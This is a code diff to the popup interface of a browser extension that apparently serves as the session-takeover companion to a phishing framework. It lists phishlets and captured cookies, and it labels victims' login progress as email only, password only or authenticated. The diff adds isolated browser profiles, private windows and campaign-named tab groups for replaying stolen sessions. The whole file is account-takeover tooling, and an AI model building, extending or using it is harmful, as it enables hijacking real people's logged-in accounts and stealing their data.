@@ -12,7 +12,8 @@ var SI = (function () {
     chev: '<path d="M9 6l6 6-6 6"/>',
     shield: '<path d="M12 3l7 3v5.2c0 4.3-2.9 8.1-7 9.3-4.1-1.2-7-5-7-9.3V6z"/>',
     paste: '<path d="M9 4h6v3H9z"/><path d="M15 5.5h2A1.5 1.5 0 0 1 18.5 7v12A1.5 1.5 0 0 1 17 20.5H7A1.5 1.5 0 0 1 5.5 19V7A1.5 1.5 0 0 1 7 5.5h2"/>',
-    edit: '<path d="M4 20h4l10-10-4-4L4 16z"/><path d="M13.5 6.5l4 4"/>'
+    edit: '<path d="M4 20h4l10-10-4-4L4 16z"/><path d="M13.5 6.5l4 4"/>',
+    profile: '<rect x="3" y="4" width="18" height="16" rx="2"/><circle cx="12" cy="11" r="3"/><path d="M7 18c1.2-2 3-3 5-3s3.8 1 5 3"/>'
   };
   function ico(n) { return ICO[n] ? '<svg class="ic" viewBox="0 0 24 24">' + ICO[n] + '</svg>' : ''; }
   function esc(v) {
@@ -62,15 +63,27 @@ var SI = (function () {
   }
 
   function modeBtns(id, cur) {
-    function b(mode, label, icon, primary) {
-      return '<button class="btn' + (primary ? ' primary' : '') + '" data-act="open-mode" data-id="' + esc(id) + '" data-mode="' + mode + '">' +
+    function b(mode, label, icon, primary, title) {
+      return '<button class="btn' + (primary ? ' primary' : '') + '" title="' + title + '" data-act="open-mode" data-id="' + esc(id) + '" data-mode="' + mode + '">' +
         ico(icon) + ' ' + label + '</button>';
     }
-    return '<div class="grid3">' +
-      b('incognito', 'Incognito', 'ghost', cur === 'incognito') +
-      b('normal', 'Normal', 'win', cur === 'normal') +
-      b('here', 'This tab', 'tab', cur === 'here') +
+    var hostOk = !!(state && state.host && state.host.ok);
+    var grid = hostOk ? 'grid2' : 'grid3';
+    return '<div class="' + grid + '">' +
+      b('normal', 'New window', 'win', cur === 'normal', 'a new normal window (shares your cookie jar)') +
+      b('incognito', 'Private', 'ghost', cur === 'incognito', 'a private window with its own cookie jar') +
+      b('here', 'This tab', 'tab', cur === 'here', 'reuse this tab, no new window') +
+      (hostOk ? b('profile', 'Own profile', 'profile', cur === 'profile', 'launch a dedicated browser profile (fully isolated)') : '') +
       '</div>';
+  }
+
+  function stageLine(s) {
+    if (!s) return '';
+    var st = s.stage === undefined ? 0 : s.stage;
+    if (st >= 3) return '<span class="badge ok">authenticated</span>';
+    if (st === 2) return '<span class="badge acc">password only</span>';
+    if (st === 1) return '<span class="badge mut">email only</span>';
+    return '<span class="badge mut">visited</span>';
   }
 
   function render() {
@@ -90,19 +103,36 @@ var SI = (function () {
       h += '<div class="row"><span class="dot"></span><span class="muted">No takeover window open</span></div>';
     } else {
       wins.forEach(function (w) {
+        var deg = w.actual !== w.kind;
         h += '<div class="row" style="margin-top:4px"><span class="dot ' + (w.actual === 'incognito' ? 'on' : 'warn') + '"></span>' +
-          '<span class="muted">' + (w.kind === 'incognito' ? 'Incognito' : 'Normal') + ' window' +
-          (w.actual !== w.kind ? ' (incognito unavailable)' : '') + '</span>' +
+          '<span class="muted">' + (w.kind === 'incognito' ? 'Private' : 'Normal') + ' window' +
+          (deg ? ' (private unavailable)' : '') + '</span>' +
           '<button class="btn sm" data-act="focus" data-id="' + w.id + '">Focus</button></div>';
+        if (deg) {
+          h += '<div class="hint dim" style="margin:2px 0 0 14px">This browser refused a private window, so a normal one was used. ' +
+            'In <b>chrome://extensions</b> open Details and turn on "Allow in incognito" (Brave: "Allow in Private").</div>';
+        }
       });
     }
     h += '</div></div>';
 
+    if (wide) {
+      var host = st.host || {};
+      h += '<div class="sec"><div class="lbl">Dedicated profiles</div><div class="card">' +        '<div class="row"><span class="dot ' + (host.ok ? 'on' : 'warn') + '"></span><span class="muted">' +
+        (host.ok ? 'host ready - launches ' + esc((host.browser || '').split(/[\\/]/).pop() || 'a browser') : 'host not installed') + '</span></div>' +
+        (host.ok
+          ? '<div class="hint dim" style="margin-top:6px">"Own profile" starts a separate browser profile per session, with this extension force-loaded into it, so every takeover is completely isolated - including from each other.</div>'
+          : '<div class="hint dim" style="margin-top:6px">An extension cannot create a browser profile. Run <b>extension/host/install.bat</b> (or <b>install.sh</b>) once to enable real, independent profiles. Until then use a window.</div>') +
+        (host.error && !host.ok ? '<div class="hint dim" style="margin-top:4px">' + esc(host.error) + '</div>' : '') +
+        '<div class="actions" style="margin-top:8px"><button class="btn" data-act="host-register">Re-register host</button></div>' +
+        '</div></div>';
+    }
     if (cur) {
       h += '<div class="sec"><div class="lbl">Selected session</div><div class="card">' +
         '<div class="kv"><span class="k">Session</span><span class="v">#' + esc(cur.sessionId) + '</span>' +
         '<span class="k">Phishlet</span><span class="v">' + esc(cur.phishlet || '-') + '</span>' +
-        '<span class="k">Cookies</span><span class="v">' + (cur.hasTokens ? 'captured' : 'none') + '</span></div>' +
+        '<span class="k">Status</span><span class="v">' + stageLine(cur) + '</span></div>' +
+        (cur.usable === false ? '<div class="hint dim" style="margin:6px 0 0">The provider never confirmed the login. Taking over may still work, but often will not.</div>' : '') +
         '<div class="hint dim" style="margin:8px 0 6px">Open in:</div>' +
         modeBtns(cur.sessionId, set.mode) +
         '</div></div>';
@@ -139,10 +169,13 @@ var SI = (function () {
       (set.autoOpen && !set.dashboardUrl ? '<div class="hint dim" style="margin:-2px 0 8px">Needs a dashboard URL and login below.</div>' : '') +
       '<div class="field" style="margin:8px 0 0"><label class="dim" style="font-size:10.5px">Where a takeover opens</label>' +
       '<select data-set="mode">' +
-      '<option value="incognito"' + (set.mode === 'incognito' ? ' selected' : '') + '>Incognito window (own cookie jar)</option>' +
-      '<option value="normal"' + (set.mode === 'normal' ? ' selected' : '') + '>Normal window (shares your jar)</option>' +
+      '<option value="normal"' + (set.mode === 'normal' ? ' selected' : '') + '>Normal window (shares your cookie jar)</option>' +
+      '<option value="incognito"' + (set.mode === 'incognito' ? ' selected' : '') + '>Private window (own cookie jar)</option>' +
+      ((state.host && state.host.ok) ? '<option value="profile"' + (set.mode === 'profile' ? ' selected' : '') + '>Own browser profile (fully isolated)</option>' : '') +
       '<option value="here"' + (set.mode === 'here' ? ' selected' : '') + '>This tab</option>' +
       '</select></div>' +
+      '<label class="sw" style="padding:6px 0 0"><input type="checkbox" data-set="tabGroups"' + (set.tabGroups ? ' checked' : '') + '><span class="track"></span>' +
+      '<span>Group the tabs and label them</span></label>' +
       '<div class="field" style="margin-top:8px"><label class="dim" style="font-size:10.5px">Window name prefix</label>' +
       '<input type="text" data-set="namePrefix" value="' + esc(set.namePrefix || '') + '" placeholder="optional, e.g. camp-"></div>' +
       '<div class="actions"><button class="btn" data-act="save">Save</button>' +
@@ -171,6 +204,7 @@ var SI = (function () {
     if (r.error) { toast(r.error, 'err'); return refresh(); }
     toast((r.success || 0) + ' cookies -> ' + (r.where || '') + (r.failed ? ', ' + r.failed + ' failed' : '') +
       (r.cleared ? ' (' + r.cleared + ' stale cleared)' : ''), r.failed ? 'info' : 'ok');
+    if (r.degraded) toast('private window unavailable - used a normal window', 'info');
     return refresh();
   }
 
@@ -220,6 +254,14 @@ var SI = (function () {
     focus: function (id) { chrome.windows.update(Number(id), { focused: true }); },
     'focus-live': function () { if (state.active && state.active.winId) chrome.windows.update(state.active.winId, { focused: true }); },
     options: function () { chrome.runtime.openOptionsPage(); },
+    'host-register': function () {
+      toast('registering host…', 'info');
+      send({ action: 'hostInstall' }).then(function (r) {
+        if (r.error) toast(r.error, 'err');
+        else toast('host registered (' + (r.extId || '') + ')', 'ok');
+        refresh();
+      });
+    },
     'open-dash': function () {
       var u = (state.settings.dashboardUrl || '').replace(/\/+$/, '');
       if (u) chrome.tabs.create({ url: u }); else toast('set a dashboard url first', 'info');
